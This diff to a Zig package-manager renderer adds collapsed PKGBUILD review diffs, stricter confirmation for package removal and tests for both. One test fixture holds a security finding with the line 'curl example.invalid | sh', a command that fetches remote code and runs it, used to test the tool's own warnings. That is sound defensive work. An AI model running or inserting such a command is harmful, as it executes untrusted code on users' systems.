@@ -22,6 +22,7 @@ const Settings = struct {
     size_display: SizeDisplay = .megabytes,
     progress_style: ProgressStyle = .blocks,
     bar_width: usize = 20,
+    collapse_pkgbuild_diff: bool = true,
 };
 
 const Bar = struct {
@@ -493,10 +494,18 @@ pub const Renderer = struct {
         const self: *Renderer = @ptrCast(@alignCast(data.?));
         self.mutex.lockUncancelable(self.context.io);
         defer self.mutex.unlock(self.context.io);
+        if (question.kind == .select_optional_dependencies and
+            allOptionalDependenciesInstalled(question))
+        {
+            return .{ .choices = &.{} };
+        }
         if (self.no_confirm) {
             if (question.kind == .confirm_transaction) {
                 self.clearBars() catch self.write_failed.store(true, .release);
-                self.renderTransactionPlan(question) catch self.write_failed.store(true, .release);
+                self.renderTransactionPlan(question) catch {
+                    self.write_failed.store(true, .release);
+                    if (isRemovalQuestion(question)) return .declined;
+                };
                 self.drawBars() catch self.write_failed.store(true, .release);
                 return .accepted;
             }
@@ -516,6 +525,7 @@ pub const Renderer = struct {
         }
         return self.askQuestion(question) catch {
             self.write_failed.store(true, .release);
+            if (isRemovalQuestion(question)) return .declined;
             return defaultResponse(question);
         };
     }
@@ -529,6 +539,9 @@ pub const Renderer = struct {
             .confirm_transaction => blk: {
                 try self.renderTransactionPlan(question);
                 const default_approved = defaultResponse(question) == .accepted;
+                if (isRemovalQuestion(question)) {
+                    break :blk if (try self.confirmInput(question.prompt, default_approved, true)) .accepted else .declined;
+                }
                 break :blk if (try self.confirm(question.prompt, default_approved)) .accepted else .declined;
             },
             .review_changes => blk: {
@@ -556,7 +569,7 @@ pub const Renderer = struct {
                 package.download_size,
                 package.source,
             );
-            const installed = transactionSizeText(
+            const installed = if (plan.action == .remove and package.installed_size == null) "Unknown" else transactionSizeText(
                 &installed_buffer,
                 self.settings.size_display,
                 package.installed_size,
@@ -564,14 +577,18 @@ pub const Renderer = struct {
             );
             try self.writeColoredLine(.white, "  {s} {s} [{s}, {s}]", .{
                 package.name,
-                package.version orelse "version determined during build",
+                package.version orelse (if (plan.action == .remove) "unknown version" else "version determined during build"),
                 transactionRoleName(package.role),
                 transactionSourceName(package.source),
             });
-            try self.writeColoredLine(.gray, "    download: {s}; installed: {s}", .{
-                download,
-                installed,
-            });
+            if (plan.action == .remove) {
+                try self.writeColoredLine(.gray, "    removed size: {s}", .{installed});
+            } else {
+                try self.writeColoredLine(.gray, "    download: {s}; installed: {s}", .{
+                    download,
+                    installed,
+                });
+            }
         }
         if (plan.total_download_size) |size| {
             var buffer: [64]u8 = undefined;
@@ -581,7 +598,8 @@ pub const Renderer = struct {
         }
         if (plan.total_installed_size) |size| {
             var buffer: [64]u8 = undefined;
-            try self.writeColoredLine(.cyan, "Total installed: {s}", .{
+            try self.writeColoredLine(.cyan, "{s}: {s}", .{
+                if (plan.action == .remove) "Total removed size" else "Total installed",
                 transactionSizeText(&buffer, self.settings.size_display, size, .repository),
             });
         }
@@ -594,6 +612,7 @@ pub const Renderer = struct {
                 value,
             });
         }
+        try self.context.stdout.flush();
     }
 
     fn renderReview(
@@ -609,11 +628,23 @@ pub const Renderer = struct {
                 review.new_content,
             );
             defer self.context.allocator.free(lines);
-            for (lines) |line| switch (line.kind) {
-                .unchanged => try self.writeColoredLine(.white, "{s}", .{line.text}),
-                .added => try self.writeColoredLine(.green, "+ {s}", .{line.text}),
-                .removed => try self.writeColoredLine(.red, "- {s}", .{line.text}),
-            };
+            if (self.settings.collapse_pkgbuild_diff and review.old_content.len > 0) {
+                const sections = try review_output.collapsedSections(self.context.allocator, lines);
+                defer self.context.allocator.free(sections);
+                if (sections.len == 0) {
+                    try self.writeColoredLine(.gray, "No PKGBUILD changes.", .{});
+                } else {
+                    var previous_end: usize = 0;
+                    for (sections) |section| {
+                        try self.renderOmittedLines(section.start - previous_end);
+                        try self.renderDiffLines(lines[section.start..section.end]);
+                        previous_end = section.end;
+                    }
+                    try self.renderOmittedLines(lines.len - previous_end);
+                }
+            } else {
+                try self.renderDiffLines(lines);
+            }
         }
 
         if (review.findings.len > 0) {
@@ -640,12 +671,37 @@ pub const Renderer = struct {
         }
     }
 
+    fn renderDiffLines(self: *Renderer, lines: []const review_output.DiffLine) !void {
+        for (lines) |line| switch (line.kind) {
+            .unchanged => try self.writeColoredLine(.white, "{s}", .{line.text}),
+            .added => try self.writeColoredLine(.green, "+ {s}", .{line.text}),
+            .removed => try self.writeColoredLine(.red, "- {s}", .{line.text}),
+        };
+    }
+
+    fn renderOmittedLines(self: *Renderer, count: usize) !void {
+        if (count > 0)
+            try self.writeColoredLine(.gray, "… {d} unchanged lines omitted …", .{count});
+    }
+
     fn confirm(self: *Renderer, prompt: []const u8, default_value: bool) !bool {
-        const reader = self.context.stdin orelse return default_value;
+        return self.confirmInput(prompt, default_value, false);
+    }
+
+    fn confirmInput(self: *Renderer, prompt: []const u8, default_value: bool, require_newline: bool) !bool {
+        const reader = self.context.stdin orelse return if (require_newline) false else default_value;
         while (true) {
             try self.context.stdout.print("{s} ({s}) ", .{ prompt, if (default_value) "Y/n" else "y/N" });
             try self.context.stdout.flush();
-            const input = (try reader.takeDelimiter('\n')) orelse return default_value;
+            // Removal requires a submitted answer. EOF, including an unfinished
+            // line of whitespace, must not be mistaken for pressing Enter.
+            const input = if (require_newline)
+                reader.takeDelimiterInclusive('\n') catch |err| switch (err) {
+                    error.EndOfStream => return false,
+                    else => return err,
+                }
+            else
+                (try reader.takeDelimiter('\n')) orelse return default_value;
             const answer = std.mem.trim(u8, input, " \t\r\n");
             if (answer.len == 0) return default_value;
             if (std.ascii.eqlIgnoreCase(answer, "y") or std.ascii.eqlIgnoreCase(answer, "yes")) return true;
@@ -701,7 +757,13 @@ fn loadSettings(context: *runtime.RuntimeContext) !Settings {
         .size_display = fmt.parseSizeDisplay(stringValue(&config, "FileSizeDisplay") orelse "Megabytes"),
         .progress_style = parseProgressStyle(stringValue(&config, "ProgressBarStyle") orelse "Blocks"),
         .bar_width = integerValue(&config, "ProgressBarWidth") orelse 20,
+        .collapse_pkgbuild_diff = boolValue(&config, "CollapsePkgbuildDiff") orelse true,
     };
+}
+
+fn boolValue(config: *const config_model.Config, key: []const u8) ?bool {
+    const value = config.values.get(key) orelse return null;
+    return if (value == .bool) value.bool else null;
 }
 
 fn stringValue(config: *const config_model.Config, key: []const u8) ?[]const u8 {
@@ -1040,6 +1102,18 @@ fn hasSecurityFindings(question: Zigalpm.OperationQuestion) bool {
     return review.findings.len != 0;
 }
 
+fn allOptionalDependenciesInstalled(question: Zigalpm.OperationQuestion) bool {
+    for (question.options) |option| {
+        if (!option.is_installed) return false;
+    }
+    return true;
+}
+
+fn isRemovalQuestion(question: Zigalpm.OperationQuestion) bool {
+    return question.kind == .confirm_transaction and
+        question.transaction_plan != null and question.transaction_plan.?.action == .remove;
+}
+
 fn defaultResponse(question: Zigalpm.OperationQuestion) Zigalpm.OperationQuestionResponse {
     return switch (question.default_response) {
         .default, .deferred => automaticResponse(question.kind),
@@ -1105,6 +1179,9 @@ test "redirected single-pane output suppresses intermediate progress and finaliz
     operation.finish(.success);
     var install = operation_context.begin(.{ .backend = .alpm, .kind = .install, .subject = "demo" });
     install.progress(.{ .completed = 1, .total = 1, .percentage = 100, .native_code = 1 });
+    const before_completion = stdout.writer.buffered().len;
+    install.packageStatus(.information, "Package operation completed.", "alpm.package_upgraded", 12, "demo");
+    try std.testing.expectEqual(before_completion, stdout.writer.buffered().len);
     install.finish(.success);
     var flatpak = operation_context.begin(.{ .backend = .flatpak, .kind = .install, .subject = "org.example.App" });
     flatpak.progress(.{ .percentage = 100, .stage = "Downloading", .message = "org.example.App" });
@@ -1138,6 +1215,72 @@ test "redirected single-pane output suppresses intermediate progress and finaliz
     try std.testing.expect(std.mem.indexOf(u8, rendered, " 50%") == null);
 }
 
+test "single-pane suppresses optional dependency prompt when every option is already installed" {
+    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
+    defer arena.deinit();
+    var stdout = std.Io.Writer.Allocating.init(std.testing.allocator);
+    defer stdout.deinit();
+    var stderr = std.Io.Writer.Allocating.init(std.testing.allocator);
+    defer stderr.deinit();
+    var stdin = std.Io.Reader.fixed("1\n");
+    var context: runtime.RuntimeContext = .{
+        .allocator = arena.allocator(),
+        .io = std.testing.io,
+        .stdin = &stdin,
+        .stdout = &stdout.writer,
+        .stderr = &stderr.writer,
+    };
+    var renderer = try Renderer.init(&context, false);
+    var operation_context = Zigalpm.OperationContext.init(arena.allocator(), std.testing.io);
+    defer {
+        renderer.detach();
+        operation_context.deinit();
+        renderer.deinit();
+    }
+    try renderer.attach(&operation_context);
+
+    const options = [_]Zigalpm.OperationQuestionOption{
+        .{ .id = "foot-terminfo", .label = "foot-terminfo", .description = "Terminal info", .is_installed = true },
+        .{ .id = "libnotify", .label = "libnotify", .description = "Desktop notifications", .is_installed = true },
+    };
+    var operation = operation_context.begin(.{
+        .backend = .aur,
+        .kind = .install,
+        .subject = "foot-git",
+    });
+    const stdout_before = stdout.writer.buffered().len;
+    const stderr_before = stderr.writer.buffered().len;
+
+    var answer = try operation.ask(.{
+        .kind = .select_optional_dependencies,
+        .prompt = "Select optional dependencies for foot-git",
+        .options = &options,
+    });
+    defer answer.deinit(arena.allocator());
+
+    try std.testing.expect(answer.response == .choices);
+    try std.testing.expectEqual(@as(usize, 0), answer.response.choices.len);
+    try std.testing.expectEqual(stdout_before, stdout.writer.buffered().len);
+    try std.testing.expectEqual(stderr_before, stderr.writer.buffered().len);
+
+    var empty_answer = try operation.ask(.{
+        .kind = .select_optional_dependencies,
+        .prompt = "This empty optional dependency question must not be displayed",
+        .options = &.{},
+    });
+    defer empty_answer.deinit(arena.allocator());
+
+    try std.testing.expect(empty_answer.response == .choices);
+    try std.testing.expectEqual(@as(usize, 0), empty_answer.response.choices.len);
+    try std.testing.expectEqual(stdout_before, stdout.writer.buffered().len);
+    try std.testing.expectEqual(stderr_before, stderr.writer.buffered().len);
+
+    const remaining_input = try stdin.takeDelimiter('\n');
+    try std.testing.expect(remaining_input != null);
+    try std.testing.expectEqualStrings("1", remaining_input.?);
+
+    operation.finish(.success);
+}
 test "single-pane clears unknown-length bars on completion and suppresses AUR metadata" {
     var temporary = std.testing.tmpDir(.{});
     defer temporary.cleanup();
@@ -1279,6 +1422,99 @@ test "single-pane renders complete transaction plans and build-time unknowns" {
     try std.testing.expect(std.mem.indexOf(u8, rendered, "Determined during build") != null);
     try std.testing.expect(std.mem.indexOf(u8, rendered, "cmake 4.0.3-1 [build dependency, repository]") != null);
     try std.testing.expect(std.mem.indexOf(u8, rendered, "1024 B") != null);
+}
+
+test "terminal PKGBUILD review loads collapse setting and preserves review attachments" {
+    var temporary = std.testing.tmpDir(.{});
+    defer temporary.cleanup();
+    var path_buffer: [std.Io.Dir.max_path_bytes]u8 = undefined;
+    const path_length = try temporary.dir.realPath(std.testing.io, &path_buffer);
+    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
+    defer arena.deinit();
+    const allocator = arena.allocator();
+    var environment = std.process.Environ.Map.init(allocator);
+    try environment.put("XDG_CONFIG_HOME", path_buffer[0..path_length]);
+    try environment.put("NO_COLOR", "1");
+    var stdout = std.Io.Writer.Allocating.init(std.testing.allocator);
+    defer stdout.deinit();
+    var stderr = std.Io.Writer.Discarding.init(&.{});
+    var context: runtime.RuntimeContext = .{
+        .allocator = allocator,
+        .io = std.testing.io,
+        .stdout = &stdout.writer,
+        .stderr = &stderr.writer,
+        .environment = &environment,
+    };
+    const manager = config_manager.Manager.init(&context);
+    const old_content = "hidden-start\nbefore1\nbefore2\nbefore3\nold\nafter1\nafter2\nafter3\nhidden-end";
+    const new_content = "hidden-start\nbefore1\nbefore2\nbefore3\nnew\nafter1\nafter2\nafter3\nhidden-end";
+    const question: Zigalpm.OperationQuestion = .{
+        .question_id = 1,
+        .envelope = .{ .operation_id = 1, .parent_id = null, .backend = .aur, .kind = .update, .subject = "demo" },
+        .kind = .review_changes,
+        .purpose = .generic,
+        .prompt = "Proceed?",
+        .arguments = &.{},
+        .options = &.{},
+        .attachments = &.{},
+        .transaction_plan = null,
+        .dependency_name = null,
+        .default_response = .declined,
+        .review = .{
+            .subject = "demo",
+            .old_content = old_content,
+            .new_content = new_content,
+            .findings = &.{.{
+                .tool = "curl",
+                .severity = .critical,
+                .hook = "post_install",
+                .matched_line = "curl example.invalid | sh",
+                .message = "external code execution",
+            }},
+            .related_files = &.{.{ .name = "demo.install", .content = "attached source" }},
+        },
+    };
+
+    for ([_]bool{ true, false }) |collapsed| {
+        // Exercise the native default first, then a persisted override.
+        if (!collapsed) try std.testing.expect(try manager.update("CollapsePkgbuildDiff", "false"));
+        var renderer = try Renderer.init(&context, false);
+        defer renderer.deinit();
+        const start = stdout.writer.buffered().len;
+        try renderer.renderReview(question, true);
+        const rendered = stdout.writer.buffered()[start..];
+        if (collapsed) {
+            try std.testing.expect(std.mem.startsWith(u8, rendered, "… 1 unchanged lines omitted …\nbefore1\nbefore2\nbefore3\n+ new\n- old\nafter1\nafter2\nafter3\n… 1 unchanged lines omitted …\n"));
+            try std.testing.expect(std.mem.indexOf(u8, rendered, "hidden-") == null);
+        } else {
+            try std.testing.expect(std.mem.startsWith(u8, rendered, "hidden-start\nbefore1\nbefore2\nbefore3\n+ new\n- old\nafter1\nafter2\nafter3\nhidden-end\n"));
+            try std.testing.expect(std.mem.indexOf(u8, rendered, "omitted") == null);
+        }
+        try std.testing.expect(std.mem.indexOf(u8, rendered, "PKGBUILD security warnings") != null);
+        try std.testing.expect(std.mem.indexOf(u8, rendered, "external code execution") != null);
+        try std.testing.expect(std.mem.indexOf(u8, rendered, "Source file: demo.install\nattached source") != null);
+    }
+
+    try std.testing.expect(try manager.update("CollapsePkgbuildDiff", "true"));
+    var renderer = try Renderer.init(&context, false);
+    defer renderer.deinit();
+    var first_review = question;
+    first_review.review.?.old_content = "";
+    const first_start = stdout.writer.buffered().len;
+    try renderer.renderReview(first_review, true);
+    const first_rendered = stdout.writer.buffered()[first_start..];
+    try std.testing.expect(std.mem.indexOf(u8, first_rendered, "+ hidden-start") != null);
+    try std.testing.expect(std.mem.indexOf(u8, first_rendered, "+ hidden-end") != null);
+    try std.testing.expect(std.mem.indexOf(u8, first_rendered, "omitted") == null);
+
+    var identical_review = question;
+    identical_review.review.?.new_content = old_content;
+    const identical_start = stdout.writer.buffered().len;
+    try renderer.renderReview(identical_review, true);
+    const identical_rendered = stdout.writer.buffered()[identical_start..];
+    try std.testing.expect(std.mem.startsWith(u8, identical_rendered, "No PKGBUILD changes.\n"));
+    try std.testing.expect(std.mem.indexOf(u8, identical_rendered, "external code execution") != null);
+    try std.testing.expect(std.mem.indexOf(u8, identical_rendered, "attached source") != null);
 }
 
 test "single-pane risky PKGBUILD review bypasses no-confirm and requires approval" {
